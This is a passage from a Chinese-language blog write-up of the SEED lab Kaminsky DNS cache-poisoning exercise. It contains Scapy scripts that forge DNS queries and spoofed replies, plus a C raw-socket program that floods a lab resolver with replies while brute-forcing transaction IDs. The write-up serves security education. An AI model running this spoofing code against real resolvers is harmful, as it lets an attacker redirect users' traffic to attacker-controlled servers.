<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">srcIP = <span class="string">&#x27;10.9.0.1&#x27;</span>   <span class="comment"># attacker</span></span><br><span class="line">dstIP = <span class="string">&#x27;10.9.0.53&#x27;</span>  <span class="comment"># Local DNS Server</span></span><br><span class="line"></span><br><span class="line">ip  = IP (dst=dstIP, src=srcIP)</span><br><span class="line">udp = UDP(dport=<span class="number">53</span>, sport=<span class="number">50945</span>, chksum=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The C code will modify the qname field</span></span><br><span class="line">Qdsec = DNSQR(qname=<span class="string">&#x27;aaaaa.example.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dns   = DNS(<span class="built_in">id</span>=<span class="number">0xAAAA</span>, qr=<span class="number">0</span>, qdcount=<span class="number">1</span>, qd=Qdsec)</span><br><span class="line"></span><br><span class="line">pkt = ip/udp/dns</span><br><span class="line">send(pkt) </span><br></pre></td></tr></table></figure>
<p>经wirshark抓包可以看到，local dns server 10.9.0.53向别的dns server发起查询，由于dns请求数据包为伪造,所以当主机收到回复的dns报文后,会产生ICMP端口不可达的回复报文：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702258258159-95188251-fc89-4597-84bf-d7055886631a.png#averageHue=%239ebe9f&clientId=u29e8a191-aa25-4&from=paste&height=371&id=u93960421&originHeight=696&originWidth=1071&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=236781&status=done&style=none&taskId=uf04af533-57ed-4877-bacd-66e8c52d131&title=&width=571.4603271484375" alt="image.png"></p>
<p><a name="QSM3h"></a></p>
<h4 id="Task-3-Spoof-DNS-Replies"><a href="#Task-3-Spoof-DNS-Replies" class="headerlink" title="Task 3: Spoof DNS Replies"></a>Task 3: Spoof DNS Replies</h4><blockquote>
<p>在这个任务中，我们需要在卡明斯基攻击中欺骗DNS回复。由于我们的目标是example.com，所以我们需要欺骗来自这个域名的名称服务器的回复。学生首先需要找出example.com的合法名称服务器的IP地址（应该注意的是，这个域名有多个名称服务器）</p>
</blockquote>
<p>用户端先看一下example.com：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702261954284-fc51083e-2e8b-477e-9b84-8b83ed864c01.png#averageHue=%23252120&clientId=u29e8a191-aa25-4&from=paste&height=321&id=u4eafd79d&originHeight=505&originWidth=851&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=34172&status=done&style=none&taskId=u2f97e6ae-52b4-4307-8be0-944f23b5f8d&title=&width=540.3174848549321" alt="image.png"><br />编写欺骗程序，目的是向local dns server返回<a href="http://www.example.com的response，并欺骗其ns为攻击者的。代码gen_dns_response.py如下：">www.example.com的response，并欺骗其ns为攻击者的。代码gen_dns_response.py如下：</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;www.example.com&quot;</span></span><br><span class="line">domain = <span class="string">&quot;example.com&quot;</span></span><br><span class="line">ns = <span class="string">&quot;ns.attacker32.com&quot;</span></span><br><span class="line"></span><br><span class="line">ip  = IP (dst = <span class="string">&#x27;10.9.0.53&#x27;</span>, src = <span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">udp = UDP(dport = <span class="number">33333</span>, sport = <span class="number">53</span>,  chksum=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Qdsec  = DNSQR(qname  = name)</span><br><span class="line">Anssec = DNSRR(rrname = name,  <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>, rdata  = <span class="string">&#x27;1.1.1.1&#x27;</span>, ttl = <span class="number">259200</span>)</span><br><span class="line">NSsec  = DNSRR(rrname = domain, <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>, rdata  = ns, ttl = <span class="number">259200</span>)</span><br><span class="line">dns    = DNS(<span class="built_in">id</span> = <span class="number">0xAAAA</span>, aa=<span class="number">1</span>, rd=<span class="number">1</span>, qr=<span class="number">1</span>, qdcount = <span class="number">1</span>, qd = Qdsec,</span><br><span class="line">             ancount = <span class="number">1</span>, an = Anssec, nscount = <span class="number">1</span>, ns = NSsec)</span><br><span class="line"></span><br><span class="line">Replypkt = ip/udp/dns</span><br><span class="line">send(Replypkt)</span><br></pre></td></tr></table></figure>
<p>攻击端执行代码，通过wireshark抓包看到我们的response成功到达local dns server：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702262200762-23991926-0d1f-4b9b-86e1-a2356cb8249c.png#averageHue=%23e6d4b7&clientId=u29e8a191-aa25-4&from=paste&height=465&id=u16cb3f9b&originHeight=860&originWidth=1068&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=206726&status=done&style=none&taskId=u5dce8e4a-57d5-4932-b2f2-79819887bc4&title=&width=577.4603271484375" alt="image.png"></p>
<p><a name="xsYpj"></a></p>
<h4 id="Task-4-Launch-the-Kaminsky-Attack"><a href="#Task-4-Launch-the-Kaminsky-Attack" class="headerlink" title="Task 4: Launch the Kaminsky Attack"></a>Task 4: Launch the Kaminsky Attack</h4><blockquote>
<p>现在我们可以把一切都集中起来，发动卡明斯基的袭击了。在攻击中，我们需要发送许多被欺骗的DNS回复，希望其中一个能到达正确的交易号码，并比合法的回复更早到达。因此，速度至关重要：我们能发送的数据包越多，成功率就越高。如果我们使用Scapy发送欺骗的DNS回复，就像我们在上的任务中所做的那样，成功率就太低了。学生可以使用C，但是在C中构建DNS包并非简单。我们介绍了一种同时使用Scapy和C的混合方法（详细信息见SEED书）。</p>
<p>通过混合方法，我们首先使用Scapy生成一个DNS数据包模板，它存储在一个文件中。然后，我们将这个模板加载到一个C程序中，并对一些字段进行小的更改，然后发送数据包。我们在Labsetup&#x2F;文件&#x2F;asisy.c中包含了一个骨架C代码。学生可以在已标记的区域上进行更改。对该代码的详细说明见指南部分。</p>
</blockquote>
<p>gen_dns_request.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">srcIP = <span class="string">&#x27;10.9.0.1&#x27;</span>  </span><br><span class="line">dstIP = <span class="string">&#x27;10.9.0.53&#x27;</span>  <span class="comment"># Local DNS Server</span></span><br><span class="line"></span><br><span class="line">ip  = IP (dst=dstIP, src=srcIP)</span><br><span class="line">udp = UDP(dport=<span class="number">53</span>, sport=<span class="number">50945</span>, chksum=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># The C code will modify the qname field</span></span><br><span class="line">Qdsec = DNSQR(qname=<span class="string">&#x27;aaaaa.example.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dns   = DNS(<span class="built_in">id</span>=<span class="number">0xAAAA</span>, qr=<span class="number">0</span>, qdcount=<span class="number">1</span>, qd=Qdsec)</span><br><span class="line"></span><br><span class="line">pkt = ip/udp/dns</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_req.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(pkt))</span><br></pre></td></tr></table></figure>
<p>gen_dns_response.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip  = IP (dst = <span class="string">&#x27;10.9.0.53&#x27;</span>, src = <span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">udp = UDP(dport = <span class="number">33333</span>, sport = <span class="number">53</span>,  chksum=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the Question section</span></span><br><span class="line"><span class="comment"># The C code will modify the qname field</span></span><br><span class="line">Qdsec  = DNSQR(qname  = <span class="string">&quot;aaaaa.example.com&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the Answer section (the answer can be anything)</span></span><br><span class="line"><span class="comment"># The C code will modify the rrname field</span></span><br><span class="line">Anssec = DNSRR(rrname = <span class="string">&quot;aaaaa.example.com&quot;</span>, <span class="built_in">type</span>   = <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">               rdata  = <span class="string">&#x27;1.2.3.4&#x27;</span>, ttl = <span class="number">259200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the Authority section (the main goal of the attack) </span></span><br><span class="line">NSsec  = DNSRR(rrname = <span class="string">&quot;example.com&quot;</span>, <span class="built_in">type</span>   = <span class="string">&#x27;NS&#x27;</span>, </span><br><span class="line">               rdata  = <span class="string">&quot;ns.attacker32.com&quot;</span>, ttl = <span class="number">259200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the DNS part </span></span><br><span class="line">dns    = DNS(<span class="built_in">id</span> = <span class="number">0xAAAA</span>, aa=<span class="number">1</span>, rd=<span class="number">1</span>, qr=<span class="number">1</span>, qdcount = <span class="number">1</span>, qd = Qdsec,</span><br><span class="line">             ancount = <span class="number">1</span>, an = Anssec, nscount = <span class="number">1</span>, ns = NSsec)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the IP packet and save it to a file.</span></span><br><span class="line">Replypkt = ip/udp/dns</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip_resp.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(Replypkt))</span><br></pre></td></tr></table></figure>

<p>编写代码attack.c:<br />1. 读取包：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FILE_SIZE 2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_IP <span class="string">&quot;10.9.0.53&quot;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">send_packet_raw</span> <span class="params">(<span class="type">int</span> sock, <span class="type">char</span> *ip, <span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">char</span>* <span class="title function_">GenerateRand</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Create raw socket</span></span><br><span class="line">    <span class="type">int</span> enable=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line">    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//####read Query.bin to ip1[] Start #########</span></span><br><span class="line">    FILE *f1 = fopen(<span class="string">&quot;ip_req.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f1) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Can&#x27;t open &#x27;ip_req.bin&#x27;&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ip1[MAX_FILE_SIZE];</span><br><span class="line">    <span class="type">int</span> n1 = fread(ip1, <span class="number">1</span>, MAX_FILE_SIZE, f1);</span><br><span class="line">    <span class="comment">//####read Query.bin End #########</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//####read Reply.bin to ip2[]  Start #########</span></span><br><span class="line">    FILE *f2 = fopen(<span class="string">&quot;ip_resp.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f2) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Can&#x27;t open &#x27;ip_resp.bin&#x27;&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ip2[MAX_FILE_SIZE];</span><br><span class="line">    <span class="type">int</span> n2 = fread(ip2, <span class="number">1</span>, MAX_FILE_SIZE, f2);</span><br><span class="line">    <span class="comment">//####read Reply.bin End#########</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>2.随机化 example.com 的子域名，发送请求包的同时，构造大量 id 响应包：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">srand((<span class="type">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> temp=<span class="number">0</span>;temp&lt;<span class="number">200</span>;temp++) <span class="comment">//重复200次</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// #######send query Begin ############</span></span><br><span class="line">        <span class="type">char</span>*name=GenerateRand();</span><br><span class="line">        <span class="comment">// Modify the name in the question field (offset=41)</span></span><br><span class="line">        <span class="built_in">memcpy</span>(ip1+<span class="number">41</span>,name, <span class="number">5</span>); </span><br><span class="line">        send_packet_raw(sock, ip1, n1);</span><br><span class="line">        <span class="comment">// #######send query End ############</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//  #######send Mult reply Begin #########</span></span><br><span class="line">        <span class="comment">//  Modify the name in the question field (offset=41)</span></span><br><span class="line">        <span class="built_in">memcpy</span>(ip2+<span class="number">41</span>, name , <span class="number">5</span>); </span><br><span class="line">        <span class="comment">// Modify the name in the answer field (offset=64)</span></span><br><span class="line">        <span class="built_in">memcpy</span>(ip2+<span class="number">64</span>,name, <span class="number">5</span>);</span><br><span class="line">        <span class="comment">// Modify the IP addr in the src IP field (offset=14) 199.43.133.53-&gt;199.43.135.53</span></span><br><span class="line">        <span class="type">char</span> c=<span class="string">&#x27;\x87&#x27;</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(ip2+<span class="number">14</span>,&amp;c, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> id=<span class="number">1</span>; id&lt;<span class="number">400</span>; id++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Modify the transaction ID field (offset=28)</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> id_net_order;</span><br><span class="line">            id_net_order = htons(id);</span><br><span class="line">            <span class="built_in">memcpy</span>(ip2+<span class="number">28</span>, &amp;id_net_order, <span class="number">2</span>); </span><br><span class="line">            <span class="comment">// Send the IP packet out</span></span><br><span class="line">            send_packet_raw(sock, ip2, n2);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">// Modify the IP addr in the src IP field (offset=14) 199.43.135.53-&gt;199.43.133.53</span></span><br></pre></td></tr></table></figure>
<p> 伪装权威域名第二个 nameserver：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">char</span> c2=<span class="string">&#x27;\x85&#x27;</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(ip2+<span class="number">14</span>,&amp;c2, <span class="number">1</span>); </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> id=<span class="number">1</span>; id&lt;<span class="number">400</span>; id++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Modify the transaction ID field (offset=28)</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">short</span> id_net_order;</span><br><span class="line">            id_net_order = htons(id);</span><br><span class="line">            <span class="built_in">memcpy</span>(ip2+<span class="number">28</span>, &amp;id_net_order, <span class="number">2</span>); </span><br><span class="line">            <span class="comment">// Send the IP packet out</span></span><br><span class="line">            send_packet_raw(sock, ip2, n2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// #######send Mult Reply End#########</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">free</span>(name);</span><br><span class="line">        name=<span class="literal">NULL</span>; <span class="comment">// A good habit for security</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;######\thave tried %d\t times, Start Next######### \n&quot;</span>,temp);</span><br><span class="line">        usleep(<span class="number">1000</span>); <span class="comment">//1000ms delay</span></span><br><span class="line">    &#125;</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>函数：随机化函数与原始套接字发送<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">GenerateRand</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> a[<span class="number">26</span>]=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"><span class="comment">// Generate a random name of length 5</span></span><br><span class="line">  <span class="type">char</span>*name=<span class="built_in">malloc</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">5</span>; k++)</span><br><span class="line">    name[k] = a[rand() % <span class="number">26</span>];</span><br><span class="line">  <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">send_packet_raw</span><span class="params">(<span class="type">int</span> sock, <span class="type">char</span> *ip, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">  dest_info.sin_family = AF_INET;</span><br><span class="line">  dest_info.sin_addr.s_addr = inet_addr(TARGET_IP);</span><br><span class="line">  <span class="type">int</span> r = sendto(sock, ip, n, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
理想情况：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702466666668-d1862b17-1239-4200-a30a-ff1da18d5741.png#averageHue=%2334352f&clientId=uf710c0e2-da37-4&from=paste&height=165&id=uf06f30e5&originHeight=262&originWidth=1673&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=459778&status=done&style=none&taskId=u45b6df7c-5391-4f60-b81f-10c304eb9d6&title=&width=1051" alt="image.png"></li>
</ol>
<p>但我多次查看缓存，发现攻击仍是失败的(原因不明)<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702297985756-1a952975-e396-4965-a323-235f08c54704.png#averageHue=%23272523&clientId=uec22433f-29ce-4&from=paste&height=51&id=ud788944c&originHeight=72&originWidth=731&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=7801&status=done&style=none&taskId=u9722ac5b-8b2f-425b-81d0-14caa5c0138&title=&width=518.1270141601562" alt="image.png"></p>
<p><a name="l5bNK"></a></p>
<h4 id="Task-5-Result-Verification"><a href="#Task-5-Result-Verification" class="headerlink" title="Task 5: Result Verification"></a>Task 5: Result Verification</h4><blockquote>
<p>如果攻击成功，则在本地DNS服务器的DNS缓存中，example.com的NS记录将成为ns.attacker32.com。当此服务器接收到针对example.com域内任何主机名的DNS查询时，它将向ns.attacker32.com发送一个查询，而不是发送到该域的合法名称服务器。</p>
</blockquote>
<ol>
<li>向 local dns server(已经被缓存)发起查询，在 dig 之前启动 wireshark 抓包：</li>
<li>直接向 attacker 的 dns server 发起 dig 查询：</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702468724078-8d940b9e-cb0d-4174-a129-0dc8759d0a8a.png#averageHue=%23252221&clientId=uf710c0e2-da37-4&from=paste&height=348&id=uacd7a4c0&originHeight=548&originWidth=759&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=41993&status=done&style=none&taskId=u7ec1838c-0f8f-4815-a35e-91cd2ac5b3e&title=&width=481.90478378953406" alt="image.png"></p>
<ol start="3">
<li>即都是在 ns.attacker32.com 里设置的 example.com zone 规则，<a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> 为 1.2.3.5.</li>
<li>抓包观察 dig <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> 的抓包 以下为第一次 dig(1.)的抓包结果，可以看到 10.9.0.5 向 10.9.0.53 即 local dns server 发起查询，local dns server 继而向 10.9.0.153 发起查询，而 10.9.0.153 为 ns.attacker32.com 的 ip，最后该 dns server 返回 <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> 的 A 记录结果。 因此我们可以判断攻击是成功的。</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702469713014-5d05c3dd-5126-4cfd-893b-5b72f7650367.png#averageHue=%23f0e2c7&clientId=uf710c0e2-da37-4&from=paste&height=234&id=uadf1fc02&originHeight=460&originWidth=1074&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=135666&status=done&style=none&taskId=u3b467645-33d7-46bf-a016-3aebf945e5d&title=&width=547.4444580078125" alt="image.png"><br />验证一下第二次 dig @ns.attacker32.com <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> 的抓包：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702469657964-709e2145-9ad1-4034-881f-ec572c1a980d.png#averageHue=%23f2e5c9&clientId=uf710c0e2-da37-4&from=paste&height=224&id=u4ea5df60&originHeight=431&originWidth=1070&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=122395&status=done&style=none&taskId=ub207043d-5b55-4bfc-bb83-3313f905bdf&title=&width=556.4404907226562" alt="image.png"><br />二者路径一致。<br><a name="kp0MH"></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实验顺利完成，即本地 LAN 与远程 dns 攻击两部分都完成。对 dns 欺骗有了更深刻的认知，对缓存投毒手段在实践中了解的更透彻。同一 LAN 中，可以通过抓包看见dns 包进而实施欺骗，而远程没有这个优势，在 id 匹配方面是不小的挑战，实验通过Kaminsky 方法完成了远程 dns 攻击。在实际情况下，除了 id 的随机化，还有 dns server 源端口变化与 DNSSEC 机制应对的挑战留待解决。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Enboy_Yu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://02lxc.github.io/post/4aa986b5.html">https://02lxc.github.io/post/4aa986b5.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://02lxc.github.io" target="_blank">Enboy_Yu's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/seedlab-DNS%E6%AC%BA%E9%AA%97/">seedlab DNS欺骗</a></div><div class="post_share"><div class="social-share" data-image="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/f52b3abf.html"><img class="prev-cover" src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SEEDLAB：幽灵攻击实验</div></div></a></div><div class="next-post pull-right"><a href="/post/4f4694a6.html"><img class="next-cover" 